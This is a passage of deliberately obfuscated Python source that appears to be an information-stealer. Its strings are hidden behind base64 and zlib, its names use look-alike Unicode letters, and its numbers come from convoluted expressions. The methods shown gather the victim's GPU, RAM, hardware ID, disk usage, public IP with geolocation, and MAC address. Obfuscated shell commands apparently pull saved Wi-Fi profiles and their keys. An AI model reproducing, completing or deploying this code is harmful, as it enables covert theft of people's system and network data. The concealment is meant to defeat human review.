        𝙜𝘱𝘂 = 𝘄𝙢𝙞.WMI().Win32_VideoController()[𝙞𝙣𝘁.from_bytes(𝘮𝗮𝙥(lambda O, i: 597 - (𝘪𝙣𝙩(𝙊) + 𝙞), 𝘮𝗮𝗽(__𝙞𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝘁𝗲𝙧(__𝗶𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝙜𝗲(0)), __𝙞𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].Name
        𝙧𝙖𝗺 = 𝘳𝘰𝘶𝘯𝗱(𝘧𝗹𝙤𝗮𝙩(𝘄𝘮𝙞.WMI().Win32_OperatingSystem()[𝙞𝘯𝘁.from_bytes(𝗺𝗮𝗽(lambda O, i: 643 - (𝙞𝘯𝘁(𝘖) + 𝙞), 𝗺𝘢𝗽(__𝘪𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝗶𝘵𝗲𝘳(__𝗶𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝗲(0)), __𝙞𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].TotalVisibleMemorySize) / 𝘪𝘯𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 853 - (𝗶𝗻𝙩(𝙊) + 𝙞), 𝗺𝙖𝙥(__𝗶𝗺𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝘵𝘦𝘳(__𝗶𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3w\t\xad\xf2w\t\xad\xf4w\xf15\x04\x00\x19\xca\x03\xd5')).decode())] * 3)), 𝗿𝘢𝙣𝗴𝘦(3)), __𝙞𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False), 𝙞𝗻𝙩.from_bytes(𝗺𝙖𝗽(lambda O, i: 887 - (𝗶𝙣𝘵(𝘖) + 𝙞), 𝙢𝙖𝙥(__𝘪𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝗶𝙩𝙚𝘳(__𝘪𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝙣𝘨𝘦(0)), __𝘪𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        𝗵𝙬𝘪𝘥 = 𝗴𝙚𝙩_𝙝𝙬𝙞𝗱()
        return (__𝙞𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0bp)p\tu\x0b5\xf3\rq,\xf7sq\xad\xf2\rI7\xf4\xcd\xf2,\xf7wq4\xf2\xcbJ.\xf7\r1I\x0f5\xce\xa9Jq\x0f+\x01\x00=\x86\x0e\x80')).decode(), __𝗶𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8btwJ\x0f4t\n\xf3\xcft2O\x0b,\xf0\x08u\x0b5\xf3\xf4(\xb1t\xce\xf1r\n\t\xc9OO56\xf0\x0evK\xf1\nr\x01\xb1\r\xd3#\xdd\x1dm\x01\xae\x1e\x105')).decode().format(𝘤𝘱𝙪, 𝘨𝙥𝘶, 𝘳𝘢𝘮, 𝗵𝘸𝙞𝘥), False)

    def disk_data(self):
        𝗱𝗶𝙨𝘬 = (__𝙞𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\x8f0H\x07\x00\rC\x02\xc5')).decode() * 𝗶𝘯𝙩.from_bytes(𝙢𝙖𝗽(lambda O, i: 607 - (𝘪𝗻𝘁(𝙊) + 𝗶), 𝗺𝙖𝙥(__𝙞𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝙞𝙩𝙚𝙧(__𝘪𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcbr\xac\x02\x00\x03v\x01t')).decode())] * 3)), 𝘳𝘢𝙣𝗴𝗲(1)), __𝗶𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)).format(__𝗶𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0b\xf2\xf0*H\xc9\r\xb5\x05\x00\x0c:\x02\xb8')).decode(), __𝘪𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xca\xf3\xca\x89\n\xb4\xb5\x05\x00\x0c\x84\x02\x9c')).decode(), __𝙞𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x0bs\xb74\x88\x0c/\xb7\x05\x00\n\x83\x02k')).decode(), __𝘪𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x0b\x8b\xf0\xcb\xf1\n\xb4\xb5\x05\x00\x0b\xe2\x02~')).decode()) + __𝙞𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode()
        for 𝘱𝘢𝙧𝘵 in 𝘱𝙨𝙪𝘵𝘪𝘭.disk_partitions(all=False):
            if 𝗼𝘀.name == __𝗶𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xca\x0b\xb4\x05\x00\x03\xb5\x01_')).decode():
                if __𝙞𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8b4\n\xaaL22\xb0\x05\x00\x0b2\x02X')).decode() in 𝘱𝘢𝗿𝘁.opts or 𝙥𝘢𝗿𝘁.fstype == __𝙞𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
                    continue
            𝘂𝘀𝗮𝗴𝙚 = 𝗽𝙨𝘶𝙩𝘪𝗹.disk_usage(𝙥𝙖𝗿𝙩.mountpoint)
            𝗱𝗶𝙨𝙠 += (__𝙞𝙢𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\x8f0H\x07\x00\rC\x02\xc5')).decode() * 𝙞𝘯𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 985 - (𝙞𝗻𝘁(𝘖) + 𝙞), 𝙢𝙖𝘱(__𝗶𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝗶𝘵𝙚𝘳(__𝙞𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\x0fI\xaf\x00\x00\x03\x82\x01\x83')).decode())] * 3)), 𝗿𝙖𝘯𝙜𝙚(1)), __𝘪𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)).format(𝙥𝙖𝙧𝘁.device, 𝙨𝙩𝗿(𝘂𝙨𝘢𝙜𝙚.free // 𝗶𝙣𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 904 - (𝗶𝘯𝘁(𝙊) + 𝘪), 𝘮𝙖𝙥(__𝙞𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝘁𝙚𝙧(__𝗶𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\x0fq\xac\x04\x00\x037\x01^')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝗲(1)), __𝘪𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) ** 𝗶𝗻𝙩.from_bytes(𝗺𝗮𝗽(lambda O, i: 397 - (𝗶𝘯𝘁(𝙊) + 𝙞), 𝙢𝗮𝙥(__𝘪𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝙞𝘵𝗲𝙧(__𝘪𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xad\x8a4\x06\x00\x03\x8b\x01T')).decode())] * 3)), 𝗿𝙖𝗻𝗴𝙚(1)), __𝘪𝙢𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + __𝗶𝘮𝗽𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x0b2\xf0\xb4\x05\x00\x02\xab\x01\t')).decode(), 𝙨𝙩𝙧(𝙪𝘴𝙖𝘨𝙚.total // 𝙞𝙣𝙩.from_bytes(𝗺𝗮𝙥(lambda O, i: 573 - (𝙞𝙣𝙩(𝘖) + 𝘪), 𝙢𝗮𝙥(__𝘪𝗺𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝘪𝘁𝗲𝘳(__𝗶𝘮𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0bI\xae\x00\x00\x03v\x01~')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝙚(1)), __𝘪𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) ** 𝗶𝘯𝘁.from_bytes(𝙢𝘢𝙥(lambda O, i: 416 - (𝘪𝘯𝙩(𝘖) + 𝗶), 𝗺𝘢𝙥(__𝘪𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝘁𝘦𝘳(__𝗶𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xadJ7\x02\x00\x03\xa6\x01a')).decode())] * 3)), 𝙧𝗮𝙣𝗴𝘦(1)), __𝙞𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + __𝗶𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x0b2\xf0\xb4\x05\x00\x02\xab\x01\t')).decode(), 𝘴𝙩𝙧(𝘶𝙨𝙖𝘨𝘦.percent) + __𝙞𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3\n\xb4\xb5\x05\x00\x02\xd6\x01\x16')).decode()) + __𝘪𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode()
        return (__𝘪𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcf\x8d*N2v*O\r\xb3\xccN\x8c\xf0+\xf2\xcftr\x05\xd1\x00i\x91\x08h')).decode(), __𝘪𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8btwJO56L\x8ftw\xb4\x05\x00\x18&\x03\x98')).decode().format(𝙙𝘪𝙨𝘬), False)

    def network_data(self):

        def geolocation(ip):
            𝘶𝘳𝗹 = __𝗶𝗺𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf31\xca)\xf7\tw+O\x0c6\xcdJ22(K\xcc\xf3+K\xca\xb44O\x0b\xb4\xb5\x05\x00\xe0\xd4\x0c\x05')).decode().format(𝗶𝘱)
            𝗿𝗲𝙨𝙥𝙤𝘯𝙨𝗲 = 𝙧𝗲𝗾𝘂𝘦𝘴𝙩𝘴.get(𝙪𝘳𝗹, headers={__𝗶𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x0b\x8b\xf0\xcbI\xce4t\x8a2\n+Mq\xb4\xb5\x05\x00-@\x05\x1e')).decode(): __𝙞𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\r\xcd\xcb\x0eD0\x14\x00\xd0oR2\x8f\x85\x85G\x0c\xa6mRJ\xcbN#\xb9\xa6*\x11\xe2\xd5\xaf\x1f\x1fpr\xb8x?:q\xaeM\xf9r\xb0\x0e\xe0\x9b\xf4\xb3\x9a\x8a\xbdw\tp\xc3\x80\xf0`#\xf1\n52\x1b\xd5\xec\x99\xa5\x80h4\x02\x93\xe1\xa1>\xb5lE\x8e;\xc9v\xca\x89\x8b5AY4\xe02)(\x8f\x0eP\x1f\xb3\xb4e\x98\xb6\x82.\xea\xba\r\x1a.\x85\x1c\x83\xedx\xde\xd7Fc\xe6\x92\x9fw\x12\xcd\xa0B\xc9\xd4\xc8|\xc6\xb6\xb2\xf4\xf2,\x05\xdf\xff\x03%74\xf8')).decode()})
            𝗱𝗮𝘁𝘢 = 𝙧𝙚𝙨𝘱𝘰𝘯𝙨𝗲.json()
            return (𝘥𝗮𝘵𝘢[__𝘪𝘮𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8b4\xb24L\xca\x0b\xaaL\r\xb4\xb5\x05\x00\x17\xea\x03\xc1')).decode()], 𝗱𝗮𝙩𝙖[__𝘪𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK\xce\r\xcbK\x0c\xb7,\r\xc9u+\x89\n\xb4\xb5\x05\x002"\x05\x9b')).decode()], 𝙙𝗮𝘁𝘢[__𝙞𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8b4\xca1H\r\xb4\xb5\x05\x00\n\xe4\x02X')).decode()], 𝘥𝙖𝘁𝘢[__𝗶𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK\xcd\xcd)\x07\x00\x04.\x01\xb6')).decode()], 𝘥𝙖𝙩𝙖[__𝙞𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8b\x8c\xf0\xb5\x05\x00\x03G\x01<')).decode()])
        𝗶𝙥 = 𝘳𝙚𝗾𝘶𝙚𝙨𝙩𝘴.get(__𝘪𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccHv\xcf.M\x8cp*\x88\xca\xcb.M2\xf6\xca\x03\x00\x86\xb1\t\xaa')).decode()).text
        𝘮𝙖𝙘 = __𝘪𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝘮𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode().join(𝗿𝗲.findall(__𝙞𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b"x\xda\xf3\xc94\xb1\x05\x00\x03\x14\x01'")).decode(), __𝙞𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\nq\xac\xf0\xcdK\xb7\x05\x00\x0c\x0b\x02\xb7')).decode() % 𝙪𝘂𝗶𝘥.getnode()))
        (𝘤𝘰𝘶𝙣𝘵𝘳𝙮, 𝙧𝗲𝙜𝗶𝙤𝙣, 𝗰𝙞𝘁𝙮, 𝘻𝘪𝙥_, 𝘢𝙨_) = 𝘨𝗲𝙤𝗹𝗼𝘤𝘢𝙩𝗶𝙤𝗻(𝗶𝗽)
        return (__𝘪𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcf\xf3\xcbHq\x0f+Nr\xcf1\x88\n\xc9O\x0f\xc9\r3H1\xb2\xacL,\xb7\xb5\x05\x00\x8e\x0c\t\x92')).decode(), __𝗶𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8btwJ\x0f\x0esL\x0f\x0c\x0f\xcaN\xce\r\xabJ\xae\xcaOO5\xca)O\x0b,\xf0\x0b\x0c\xf5E\x137\xcc\x8846\xf0\x0e4\xb24L\xca\x0b\xaaL\r\x01\x89\xf9\x95\xa5\x84\x9b\x1a$\xe7\xe5X:\xe7x\xe5D\x19\xe5\x94%e\x01\xc5\x8d\xa1\xec<\x90\xfa\x1c\x03\xa8\xda\x82\x14\x8f\x1cKO\xe7\x0c\xf3\xd4\xdc\x9c\xf2\x08c\x83\x02\xe7\xec\x9c\x90P\x17\x90\x9c[U\x84\xb1az\xa4\xbb\xa3-\x00\x17/2\xe3')).decode().format(ip=𝙞𝘱, mac=𝘮𝘢𝙘, country=𝙘𝘰𝘂𝙣𝙩𝗿𝘺, region=𝘳𝗲𝘨𝙞𝗼𝘯, city=𝗰𝘪𝘁𝙮, zip_=𝘇𝗶𝗽_, as_=𝘢𝙨_), False)

    def wifi_data(self):
        (𝙣𝗲𝙩𝘸𝙤𝘳𝘬𝙨, 𝘰𝘂𝘁) = ([], __𝗶𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        try:
            𝘄𝙞𝗳𝘪 = 𝘴𝘶𝗯𝙥𝗿𝘰𝘤𝘦𝘴𝙨.check_output([__𝗶𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK\xca\r3H6J\xb7\x05\x00\x0c4\x02\x8f')).decode(), __𝙞𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK1\xaa\xc8HJ\xb7\xb5\x05\x00\x0c\xd2\x02\xba')).decode(), __𝙞𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK6\xca(K)\xb7\xb5\x05\x00\x0c\xe8\x02\xc9')).decode(), __𝘪𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK\xf6\xf0*\x8b\xca\xcd)\x8e\x8a\xf0\xb5\x05\x00\x1c\xab\x04N')).decode()], shell=True, stdin=𝙨𝘂𝗯𝙥𝘳𝗼𝘤𝗲𝘀𝘴.PIPE, stderr=𝘀𝙪𝘣𝗽𝙧𝘰𝘤𝘦𝘴𝘀.PIPE).decode(__𝗶𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝗶𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())
            𝘄𝙞𝙛𝙞 = [𝙞.split(__𝙞𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())[𝘪𝙣𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 621 - (𝗶𝗻𝘁(𝙊) + 𝗶), 𝘮𝘢𝘱(__𝘪𝘮𝙥𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝙩𝘦𝙧(__𝘪𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcb\xf2,\x07\x00\x03\x83\x01y')).decode())] * 3)), 𝙧𝙖𝗻𝘨𝗲(1)), __𝗶𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)][𝗶𝙣𝘁.from_bytes(𝘮𝗮𝗽(lambda O, i: 590 - (𝗶𝙣𝘁(𝙊) + 𝙞), 𝙢𝘢𝘱(__𝘪𝗺𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝗶𝙩𝙚𝗿(__𝘪𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3\x0bI7\x05\x00\x03;\x01?')).decode())] * 3)), 𝙧𝗮𝘯𝙜𝙚(1)), __𝙞𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):-𝘪𝘯𝙩.from_bytes(𝘮𝘢𝘱(lambda O, i: 765 - (𝘪𝙣𝘁(𝗢) + 𝘪), 𝘮𝙖𝗽(__𝗶𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝘪𝘵𝗲𝗿(__𝗶𝗺𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xab\x8a4\x00\x00\x03\x8c\x01R')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝗲(1)), __𝗶𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] for 𝗶 in 𝘄𝗶𝗳𝘪 if __𝗶𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0b\x0c\xaf(\xf6t\x0b\xab\x8a\x8a\xf0L\x0f\xf5\xf0*\x8b\xca\xcd)\x8e\n\xb4\xb5\x05\x00l\x0f\x08}')).decode() in 𝙞]
            for 𝙣𝘢𝘮𝘦 in 𝙬𝘪𝙛𝘪:
                try:
                    𝗿𝙚𝙨𝘂𝙡𝙩𝙨 = 𝘴𝙪𝘣𝙥𝙧𝗼𝗰𝙚𝘀𝙨.check_output([__𝘪𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\xca\r3H6J\xb7\x05\x00\x0c4\x02\x8f')).decode(), __𝘪𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK1\xaa\xc8HJ\xb7\xb5\x05\x00\x0c\xd2\x02\xba')).decode(), __𝙞𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK6\xca(K)\xb7\xb5\x05\x00\x0c\xe8\x02\xc9')).decode(), __𝙞𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK\xf6\xf0*\x8b\xca\xcd)\x8e\n\xb4\xb5\x05\x00\x1cv\x047')).decode(), 𝗻𝘢𝙢𝙚, __𝙞𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xdaK4\n3\r\x08\xf7+\x8e\nw\xab\x04\x00\x18]\x03\xf7')).decode()], shell=True, stdin=𝘀𝙪𝙗𝙥𝙧𝗼𝗰𝗲𝘀𝙨.PIPE, stderr=𝙨𝘂𝘣𝗽𝙧𝙤𝗰𝙚𝙨𝘀.PIPE).decode(__𝙞𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝙞𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())
